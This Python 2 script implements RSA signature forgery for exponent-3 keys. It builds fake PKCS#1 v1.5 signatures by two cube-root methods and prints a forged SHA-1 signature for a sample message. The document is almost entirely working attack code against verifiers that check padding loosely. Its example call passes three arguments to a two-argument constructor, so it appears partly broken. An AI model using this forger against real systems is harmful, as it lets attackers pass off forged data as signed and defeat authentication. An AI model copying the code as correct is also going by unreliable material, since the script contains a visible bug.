#!/usr/bin/python

import binascii
import hashlib
import gmpy2
import os

from HashInfo import *

from decimal import Decimal, getcontext

keysize = 1024

def getBitAt(idx, val):
  return (val >> idx) & 0x01

def setBitAt(idx, val):
  return val | (0x01 << idx)

def toInt(val):
  return int(val.encode("hex"), 16)

def toBytes(val):
  hexVal = hex(val)[2:-1]
  if len(hexVal) % 2 == 1:
    hexVal = "0"+hexVal
  return hexVal.decode("hex")

class SignatureForger:

  def __init__(self, keysize, hashAlg):
    self.keysize = keysize
    self.hashAlg = Hash(hashAlg)

  def encodePkcs1Suffix(self, message):
    messageHash = self.hashAlg.digester(message).digest()
    if ord(messageHash[-1]) & 0x01 != 0x01:
      print("Hash value must be uneven. Try a different message")
      exit()
    suffix = "\x00" + self.hashAlg.digestInfo + messageHash
    return suffix
  
  def constructSignatureSuffix(self, suffix):
    signatureSuffix = 1
    for idx in range(len(suffix) * 8):
      if getBitAt(idx, signatureSuffix ** 3) != getBitAt(idx, toInt(suffix)):
        signatureSuffix = setBitAt(idx, signatureSuffix)
    return toBytes(signatureSuffix)

  def addPrefixToSignature(self, signatureSuffix):
    prefix = "\x00\x01"
    prefix += "\xFF"*8
    while True:
      testPrefix = prefix + os.urandom((self.keysize/8) - (len(prefix)))
      signatureCandidate = toBytes(int(gmpy2.cbrt(toInt(testPrefix))))[:-len(signatureSuffix)] + signatureSuffix
      toCheck = toBytes(toInt(signatureCandidate) ** 3)
      if "\x00" not in toCheck[:-len(signatureSuffix)]:
        return signatureCandidate


  def forgeSignature_method1(self, message):
    suffix = self.encodePkcs1Suffix(message)
    signatureSuffix = self.constructSignatureSuffix(suffix)
    signature = self.addPrefixToSignature(signatureSuffix)
    return signature

  def nthroot (self, n, A, precision=300):
    getcontext().prec = precision
   
    n = Decimal(n)
    x_0 = A / n #step 1: make a while guess.
    x_1 = 1     #need it to exist before step 2
    while True:
      #step 2:
      x_0, x_1 = x_1, (1 / n)*((n - 1)*x_0 + (A / (x_0 ** (n - 1))))
      if x_0 == x_1:
        return x_1

  def forgeSignature_method2(self, message, psLength=8):
    prefix = "\x00\x01"
    prefix += "\xFF"*psLength
    suffix = self.encodePkcs1Suffix(message)
    plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
    signature = toBytes(int(self.nthroot(3, toInt(plain)))+1)
    return signature

if __name__ == "__main__":
  message = "WhAAASDAatWhatInTheButt"
  signatureForger = SignatureForger(1024, "SHA-1", 1)
  #signature = signatureForger.forgeSignature_method1(message)
  signature = signatureForger.forgeSignature_method2(message)
  print(hex(toInt(signature) ** 3))
  
'''
output format: raw, hex, base64
keysize: raw, from public key
hash algo, md5, sha1, sha256, sha384, sha512
message to sign: ascii, hex, base64
'''

